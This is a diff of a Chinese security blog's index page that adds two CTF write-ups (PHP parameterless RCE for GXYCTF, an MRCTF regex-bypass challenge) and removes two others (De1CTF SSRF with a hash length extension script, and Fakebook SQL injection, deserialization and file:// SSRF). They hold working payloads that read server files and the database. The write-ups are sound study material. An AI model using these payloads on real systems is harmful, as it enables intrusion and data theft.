@@ -139,6 +139,223 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-无参RCE" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/20/%E6%97%A0%E5%8F%82RCE/">无参RCE</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/20/%E6%97%A0%E5%8F%82RCE/" class="archive-article-date">
+  	<time datetime="2020-04-20T13:33:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="由一道题学习PHP无参RCE"><a href="#由一道题学习PHP无参RCE" class="headerlink" title="由一道题学习PHP无参RCE"></a>由一道题学习PHP无参RCE</h3><p>之前一直想学习下无参RCE是什么，今天做题时也遇到了。就简要总结下无参RCE相关知识；</p>
+<h4 id="什么是无参RCE？"><a href="#什么是无参RCE？" class="headerlink" title="什么是无参RCE？"></a>什么是无参RCE？</h4><p>顾名思义，无参RCE就是通过传入没有参数的函数达到命令执行的效果；一般会出现这样的正则匹配时，考虑使用无参RCE</p>
+<pre><code>if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) {    
+eval($_GET[&apos;code&apos;]);
+}</code></pre><p>面对这样的过滤，我们的函数是传递不了参数的，即只能使用这样的形式：</p>
+<pre><code>eval(a())    可以
+eval(a(&apos;111&apos;))     不可以</code></pre><p>说白了，无参RCE有点类似套娃…前一个函数的结果作为下一个函数的参数；<br>既然我们不可以传递参数，那么只能使用PHP提供的函数作为我们的参数，达到执行效果；下面介绍几个PHP无参RCE经常使用的函数和方法：</p>
+<h4 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h4><p>get_defined_vars()返回所有变量名及其对应的变量名；<br><img src="../images/38.jpg" alt="1"><br><img src="../images/39.jpg" alt="2"></p>
+<h4 id="操纵数组的函数"><a href="#操纵数组的函数" class="headerlink" title="操纵数组的函数"></a>操纵数组的函数</h4><pre><code>end() – 将内部指针指向数组中的最后一个元素，并输出
+next() – 将内部指针指向数组中的下一个元素，并输出
+prev() – 将内部指针指向数组中的上一个元素，并输出
+reset() – 将内部指针指向数组中的第一个元素，并输出
+each() – 返回当前元素的键名和键值，并将内部指针向前移动</code></pre><p><img src="../images/41.jpg" alt="3"><br><img src="../images/40.jpg" alt="4"></p>
+<h4 id="array-rand-array-flip"><a href="#array-rand-array-flip" class="headerlink" title="array_rand(array_flip())"></a>array_rand(array_flip())</h4><p>array_rand()随机返回数组中一个元素的Key值；<br>array_flip()将数组中的元素，键值位置进行对调；<br><img src="../images/42.jpg" alt="5"><br>比如我们想要读取数组中的flag.php；因为array_rand()只能返回数组元素中的key，所以可以使用array_flip()将键值位置对调，再结合array_rand()读取flag.php；因为array_rand()是随机返回，所以需要多试几次；</p>
+<h4 id="session-id-session-start"><a href="#session-id-session-start" class="headerlink" title="session_id(session_start())"></a>session_id(session_start())</h4><p><img src="../images/43.jpg" alt="6"><br>session_id()可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路，即hex2bin，可以将我们要进行的操作经过hex()存放到PHPSESSID中。<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>然后hex2bin(session_id())即可还原我们要执行的操作</p>
+<h4 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h4><p>getallheaders()获取所有http头部信息<br>所以可以通过添加http头部信息,达到RCE的效果<br><img src="../images/44.jpg" alt="7"><br><img src="../images/45.jpg" alt="8"></p>
+<h4 id="dirname-amp-scandir"><a href="#dirname-amp-scandir" class="headerlink" title="dirname() &amp; scandir()"></a>dirname() &amp; scandir()</h4><p>scandir()扫描当下有哪些文件<br>dirname()跳到上一级<br>首先，我们可以利用getcwd()获取当前目录</p>
+<pre><code>?code=var_dump(getcwd());
+
+string(13) &quot;/var/www/html&quot;</code></pre><p>可以利用scandir()扫描</p>
+<pre><code>?code=var_dump(scandir(getcwd()));
+
+array(3) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; }</code></pre><p>利用dirname()跳到上一级</p>
+<pre><code>?code=var_dump(scandir(dirname(getcwd())));
+
+array(4) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(14) &quot;flag_phpbyp4ss&quot; [3]=&gt; string(4) &quot;html&quot; }</code></pre><p>对于scandir()我们常常要使用scandir(.)，这个”.”怎么获得呢？<br>1、localeconv() 函数返回一包含本地数字及货币格式信息的数组，而current(localeconv())永远都是个点，所以可以使用scandir(current(localeconv())),如果current用不了，可以使用pos()<br>2、chr(rand())<br>3、chr(time())</p>
+<h4 id="如何读取源码"><a href="#如何读取源码" class="headerlink" title="如何读取源码"></a>如何读取源码</h4><p>file_get_contents()，还可以使用readfile()或highlight_file()以及其别名函数show_source()</p>
+<h4 id="GXYCTF-禁止套娃"><a href="#GXYCTF-禁止套娃" class="headerlink" title="GXYCTF 禁止套娃"></a>GXYCTF 禁止套娃</h4><p>因为.git泄露，使用githack还原得到源码：</p>
+<pre><code>&lt;?php
+include &quot;flag.php&quot;;
+echo &quot;flag在哪里呢？&lt;br&gt;&quot;;
+if(isset($_GET[&apos;exp&apos;])){
+if (!preg_match(&apos;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&apos;, $_GET[&apos;exp&apos;])) {
+    if(&apos;;&apos; === preg_replace(&apos;/[a-z,_]+\((?R)?\)/&apos;, NULL, $_GET[&apos;exp&apos;])) {
+        if (!preg_match(&apos;/et|na|info|dec|bin|hex|oct|pi|log/i&apos;, $_GET[&apos;exp&apos;])) {
+            // echo $_GET[&apos;exp&apos;];
+            @eval($_GET[&apos;exp&apos;]);
+        }
+        else{
+            die(&quot;还差一点哦！&quot;);
+        }
+    }
+    else{
+        die(&quot;再好好想想！&quot;);
+    }
+}
+else{
+    die(&quot;还想读flag，臭弟弟！&quot;);
+}
+}
+// highlight_file(__FILE__);
+?&gt;</code></pre><p>可以看见正则表达式不允许使用伪协议，以及带参数的函数。考察PHP无参RCE<br>可以知道flag在flag.php里，先用scandir(.)查看当下目录里有哪些文件：</p>
+<pre><code>?exp=print_r(var_dump(scandir(current(localeconv()))));</code></pre><p><img src="../images/46.jpg" alt="9"><br>发现有flag.php，现在的问题就是怎么把flag.php这个字符串拿出来，交给读文件函数进行读出；<br>可以使用array_rand(array_flip());</p>
+<pre><code>?exp=print_r(var_dump(array_rand(array_flip(scandir(current(localeconv()))))));</code></pre><p><img src="../images/48.jpg" alt="10"><br>成功将”flag.php”提出来了；接下来就是使用文件读写函数了，因为过滤了get，所以不能使用file_get_contents;使用highlight_file读写：</p>
+<pre><code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></pre><p><img src="../images/49/jpg" alt="11"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>PHP无参RCE，主要是考察PHP函数的熟练程度；应该还有其他姿势待开发，以后再补充。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">RCE，PHP函数</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/20/%E6%97%A0%E5%8F%82RCE/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-MRCTF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/20/MRCTF/">MRCTF</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/20/MRCTF/" class="archive-article-date">
+  	<time datetime="2020-04-20T13:13:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="MRCTF–套娃"><a href="#MRCTF–套娃" class="headerlink" title="MRCTF–套娃"></a>MRCTF–套娃</h3><p>查看源码，发现：<br><img src="../images/34.jpg" alt="1"><br>要求不能出现”_”，想到URL编码，但是正则要求不能为%5f（_对应的URL编码就是%5f）。但是可以使用%5F绕过；<br>第二个条件：要求$_GET[b_u_p_t]=23333，又不能为2333；之前也提过对于/^xxx$/类型的正则匹配，可以使用%0a绕过；<br>所以构造payload:</p>
+<pre><code>http://b1a486b8-3995-435d-948f-dabc07641b05.node3.buuoj.cn/index.php?b%5Fu%5Fp%5Ft=23333%0a</code></pre><p>拿到提示flag在secrettw.php<br>进去发现：<br><img src="../images/35.jpg" alt="2"><br>要求我们使用本地登陆，bp拦截添加Client-IP:127.0.0.1即可；同时说明我们没有权限，view-source后，发现一段jsfuck加密的密文，解密后提示POST Merak，尝试POST Merak=admin（Merak随便什么值即可）显示了源码：<br><img src="../images/37.jpg" alt="3"><br>要求我们传入两个参数2333和file，第一个参数用来作为文件名，且该文件名对应内容要为”todat is a happy day”;使用data://协议即可。第二个file参数经过change()函数后返回要读文件名，也就是flagphp；写个dechange脚本，即可拿到file的值，脚本如下：</p>
+<pre><code>&lt;?php
+    function dechange($a){
+        $re=&apos;&apos;;
+        for($i=0;$i&lt;strlen($a);$i++){
+            $re.=chr(ord($a[$i])-$i*2);
+        }
+        $result=base64_encode($re);
+        return $result;
+    }
+
+echo (dechange(&apos;flag.php&apos;));
+?&gt;</code></pre><p>得到file值为ZmpdYSZmXGI=<br>最后构造payload:</p>
+<pre><code>b1a486b8-3995-435d-948f-dabc07641b05.node3.buuoj.cn/secrettw.php?2333=data://text/plain,todat  is  a  happy day&amp;file=ZmpdYSZmXGI=</code></pre><p>即可得flag</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/20/MRCTF/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Python-test" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1075,322 +1292,6 @@ if (! empty($_REQUEST[&apos;file&apos;])  ##不能为空
 
 
   
-    <article id="post-SSRF-me" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/10/SSRF-me/">SSRF_me</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/10/SSRF-me/" class="archive-article-date">
-  	<time datetime="2020-04-10T12:41:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>1、哈希长度拓展攻击（hash_dump工具）<br>2、字符串拼接利用<br>3、Flask框架代码审计</p>
-<h4 id="De1CTF-SSRF-me"><a href="#De1CTF-SSRF-me" class="headerlink" title="De1CTF-SSRF me"></a>De1CTF-SSRF me</h4><p>进入页面就可以发现源码：（因为第一次接触Flask框架，就写的稍微详细一点）</p>
-<pre><code>#! /usr/bin/env python
-#encoding=utf-8
-from flask import Flask
-from flask import request
-import socket
-import hashlib
-import urllib
-import sys
-import os
-import json
-
-reload(sys)
-sys.setdefaultencoding(&apos;latin1&apos;) //设置默认字体
-
-app = Flask(__name__) //创建一个Flask实例app客户端（一般是浏览器）将请求发送给服务端Web服务器，Web服务器再把请求发给Flask实例。
-
-secert_key = os.urandom(16)//随机生成16Byte密钥，是这次MD5拓展攻击成功的一个因素
-
-class Task:
-def __init__(self, action, param, sign, ip):
-    self.action = action
-    self.param = param
-    self.sign = sign
-    self.sandbox = md5(ip)
-    if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
-        os.mkdir(self.sandbox)
-
-def Exec(self):
-    result = {}
-    result[&apos;code&apos;] = 500
-    if (self.checkSign()):
-        if &quot;scan&quot; in self.action://如果是“scan”动作，就将扫描结果写入文件中
-            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)
-            resp = scan(self.param)
-            if (resp == &quot;Connection Timeout&quot;):
-                result[&apos;data&apos;] = resp
-            else:
-                print(resp)
-                tmpfile.write(resp)
-                tmpfile.close()
-            result[&apos;code&apos;] = 200
-        if &quot;read&quot; in self.action://如果是“read”操作，就将文件内容以Json格式返回给浏览器
-            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)
-            result[&apos;code&apos;] = 200
-            result[&apos;data&apos;] = f.read()
-        if result[&apos;code&apos;] == 500:
-            result[&apos;data&apos;] = &quot;Action Error&quot;
-    else:
-        result[&apos;code&apos;] = 500
-        result[&apos;msg&apos;] = &quot;Sign Error&quot;
-    return result
-
-def checkSign(self)://验证签名是否一致
-    if (getSign(self.action, self.param) == self.sign):
-        return True
-    else:
-        return False
-#generate Sign For Action Scan.
-@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])  //如果是访问/geneSign，则返回“(secret_key+param+scan)”的加密结果
-def geneSign():
-param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
-action = &quot;scan&quot;
-return getSign(action, param)
-
-@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;]) 
-def challenge():
-action = urllib.unquote(request.cookies.get(&quot;action&quot;))
-param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
-sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
-ip = request.remote_addr
-if(waf(param)): //不能使用gopher、data协议
-    return &quot;No Hacker!!!!&quot;
-task = Task(action, param, sign, ip)
-return json.dumps(task.Exec())
-@app.route(&apos;/&apos;)
-def index(): //显示主页面源码
-return open(&quot;code.txt&quot;,&quot;r&quot;).read()
-
-def scan(param):
-   socket.setdefaulttimeout(1)
-   try:
-      return urllib.urlopen(param).read()[:50]
-   except:
-      return &quot;Connection Timeout&quot;
-
-def getSign(action, param): //加密签名操作
-     return hashlib.md5(secert_key + param + action).hexdigest()
-
-def md5(content):
-      return hashlib.md5(content).hexdigest()
-
-def waf(param):
-check=param.strip().lower()
-if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
-    return True
-else:
-    return False
-
-if __name__ == &apos;__main__&apos;:
-app.debug = False
-app.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><h4 id="首先开始审计代码，发现总共有三个页面："><a href="#首先开始审计代码，发现总共有三个页面：" class="headerlink" title="首先开始审计代码，发现总共有三个页面："></a>首先开始审计代码，发现总共有三个页面：</h4><p>（1）主页面/index.php 用来显示源码，没什么特殊的地方<br>（2）/De1ta，接受action,param，sign三个参数；<br>（3）/geneSign 返回（secret_key+param+scan)MD5加密值<br>题目提示我们flag在flag.txt里；猜测应该就是利用exec函数想办法读到flag.txt里的内容。来审计一下exec()：<br><img src="../images/24.jpg" alt="2"><br>其中scan模式，是将param参数文件的内容写入/sandbox/result.txt中<br>read模式，则是将/sandbox/result.txt的内容读出来；<br>那这时就可以考虑先将flag.txt的内容写入result.txt中，然后使用read模式将result.txt读出来，flag.txt内容自然也就出来了；那对于参数”action”就得包含”read”和”scan”;<br>但前提是CheckSign()为True；跟进CheckSign():<br>要求Getsign(self.action, self.param)==self.sign<br><img src="../images/25.jpg" alt="3"><br>再跟进Getsign()函数：<br>发现是对（secr_key+param+action)MD5加密；<br><img src="../images/26.jpg" alt="4"><br>现在的问题就是使得MD5加密后的值要与我们提交的Sign参数相等；但我们并不清楚secret_key的值，无法构造sign；这时注意/geneSign页面，发现返回一个md5值，但却是对(secret_key+param+scan)加密；我们的目标是要构造(secret_key+param+readscan),然后将值赋给参数”sign”;</p>
-<h4 id="解法一：巧妙利用字符串拼接"><a href="#解法一：巧妙利用字符串拼接" class="headerlink" title="解法一：巧妙利用字符串拼接"></a>解法一：巧妙利用字符串拼接</h4><p>重新观察getsign()，发现他是通过”+”将三个变量组成字符串，即对（”secret_keyparamaction”)加密；而/geneSign的结果是对（”secret_keyparamscan”)加密生成的，因为这里scan是固定死的，无从下手，但可以通过param变量将”read”添加进去，即param=flag.txtread;则返回的结果是对（”secret_keyflag.txtreadscan”)加密结果；也就生成了我们需要的sign值；<br><img src="../images/27.jpg" alt="5"><br>此时再构造payload，拿到flag：<br><img src="../images/28.jpg" alt="6"></p>
-<h4 id="解法二：哈希长度拓展攻击"><a href="#解法二：哈希长度拓展攻击" class="headerlink" title="解法二：哈希长度拓展攻击"></a>解法二：哈希长度拓展攻击</h4><p>详细情况，请参考：<a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">https://joychou.org/web/hash-length-extension-attack.html</a><br>我简要概括一下：当已知以下三点</p>
-<pre><code>1、md5(salt+message)的值
-2、message内容
-3、salt+message长度</code></pre><p>我们可以在不知道salt的具体内容的情况下，计算出任意的md5(salt+message+padding+append)值<br>比如就这道题而言，我们已经知道salt为16字节，而flag.txt为8字节<br>所以(salt+message)为24字节；而数据为scan;想要扩展的内容为read；<br>所以使用hash_Pump工具，生成加密值：<br><img src="../images/29.jpg" alt="7"><br>payload:</p>
-<pre><code>import requests
-
-url = &apos;http://33e7e4ef-eaf5-46ac-9523-c0c7dab3c41f.node3.buuoj.cn/De1ta?param=flag.txt&apos;
-
-cookies = {
-&apos;sign&apos;: &apos;42c217eb3287c266c686501944d4ff2d&apos;,
-&apos;action&apos;: &apos;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&apos;,
-}
-
-res = requests.get(url=url, cookies=cookies)
-print(res.text)</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这道题主要学习了Flask框架的代码审计，哈希拓展攻击，以及巧妙利用字符串拼接，生成我们想要的sign值；</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计，hash_dump</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/10/SSRF-me/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Fakebook" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/07/Fakebook/">Fakebook</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/07/Fakebook/" class="archive-article-date">
-  	<time datetime="2020-04-07T09:02:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="网鼎杯——Fakebook"><a href="#网鼎杯——Fakebook" class="headerlink" title="网鼎杯——Fakebook"></a>网鼎杯——Fakebook</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>1、sql注入<br>2、PHP反序列化<br>3、ssrf漏洞</p>
-<p>首先发现主页面有两个功能（login、join）。注册后，查看用户信息页面，发现Url可能存在sql注入；<br><img src="../images/16.jpg" alt="1"><br>尝试</p>
-<pre><code>?no=1 and 1=1#
-?no=1 and 1=2#</code></pre><p>的确存在数字型sql注入；接下来尝试猜测sql查询语句中有几列列名：结果为4列<br><img src="../images/15.jpg" alt="2"><br>接下来就是爆库名、表名、列名；但发现union select被过滤。此时可以有已下几种思路绕过：<br>（1）双写绕过（若只删除第一个匹配的内容，即可绕过）：seselectlect,ununionion<br>（2）大小写绕过：SeLect、UniOn<br>（3）注释符绕过：u/**/nion/<strong>/se/\</strong>/lect<br>对于这道题，可以使用union/**/select绕过。爆出库名、表名、列名：</p>
-<pre><code>?no=-1 union/**/select 1,database(),3,4# 库名为“fakebook”
-?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;# 表名为“users”
-?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;# 列名如下
-?no=-1 union/**/select 1,group_concat(username,passwd,data),3,4 from users#</code></pre><p><img src="../images/17.jpg" alt="3"><br><img src="../images/18.jpg" alt="4"><br>但是做到这一步后思路没了，从爆出的数据可以发现data列是将我们注册的相关信息序列化后存储于数据库中，我感觉可能跟这个序列化数据有关系，但不知道怎么利用；后来看了wp，发现还可以查看robots.php，查看源码（有师傅说是御剑扫出来的…怎么我的御剑就没扫出来呢…）；<br>源码如下：</p>
-<pre><code>&lt;?php
-class UserInfo
-{
-    public $name = &quot;&quot;;
-    public $age = 0;
-    public $blog = &quot;&quot;;
-}
-    public function __construct($name, $age, $blog) //看到魔术函数，想到序列化
-{
-    $this-&gt;name = $name;
-    $this-&gt;age = (int)$age;
-    $this-&gt;blog = $blog;
-}
-
-function get($url) //存在ssrf漏洞
-{
-    $ch = curl_init();
-
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $output = curl_exec($ch);//将请求的网页内容返回给output
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    if($httpCode == 404) {
-        return 404;
-    }
-    curl_close($ch);
-
-    return $output;
-}
-
-public function getBlogContents () 
-{
-    return $this-&gt;get($this-&gt;blog);//将blog变量传入get函数中，由于blog变量用户可控；可以利用这一点，构造payload；
-}
-
-public function isValidBlog () //判断blog输入格式是否符合要求
-{
-    $blog = $this-&gt;blog;
-    return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
-}
-}</code></pre><p>通过代码审计，我们发现get（）函数存在ssrf漏洞，由于blog变量用户可控，那么就可利用这一点。<br>这里有一个关键的地方，需要我们自己去猜想：很有可能是将用户注册的个人信息序列化后，存储到数据库中；再将data列中blog的内容提取出来经过反序列化后，进行加载（SSRF漏洞）。这里附上view.php源码<br><img src="../images/19.jpg" alt="5"><br>既然如此，我们可以利用sql注入将构造好的序列化内容注入到数据库中，当从数据库中提取构造好的内容时，自然会加载得到我们想要的内容；可以使用file://协议进行读取。<br>这里存在一个小问题，目标文件路径并不清楚；但从之前报错的信息来看为/var/www/html;猜测文件名为flag.php（有师傅说这个也可以扫出来….）所以就可以使blog=file:///var/www/html/flag.php<br>下面将个人信息进行序列化，注入到数据库中；</p>
-<pre><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}</code></pre><p>这里注意，因为序列化内容对应的是第四列，因此payload为：</p>
-<pre><code>?no=-1 union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&apos;#</code></pre><p>查看源码，base64解码即可得到flag：<br>flag{c58e6648-1cad-4546-83c3-b09769087157}<br>###小结<br>这道题主要考察了sql注入、ssrf、php反序列化漏洞三个知识点；<br>（1）sql注入主要考察如何绕过union select过滤；这里我学到一个小知识，以前习惯性认为select语句只能用于查询，而这道题却是通过select语句将构造好的内容注入进数据库中；本地测试了一下；发现union联合的两句select语句，会将第二句select的查找对象“暂时性”存入前面select语句所对应的查询数据库中；这也是这道题为什么可以把内容存入数据库的原因；<br><img src="../images/20.jpg" alt="6"><br><img src="../images/21.jpg" alt="7"><br>拓展一下：其实爆库、表名、列名最主要依靠的是information_schema这个库，如果这个库被ban了咋办呢?卖个关子，下回分解；<br>（2）这里ssrf漏洞利用了file协议读取某个文件。除此之外常用的还有gopher、dict协议等，后续文章会详细介绍；<br>（3）这里主要是将用户信息先进行序列化后存入数据库；看到_construct()构造函数就得猜测是否有反序列化漏洞；</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sql,PHP反序列化,ssrf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/07/Fakebook/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1533,6 +1434,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">RCE，PHP函数</a>
               </li>
             
             <div class="clearfix"></div>
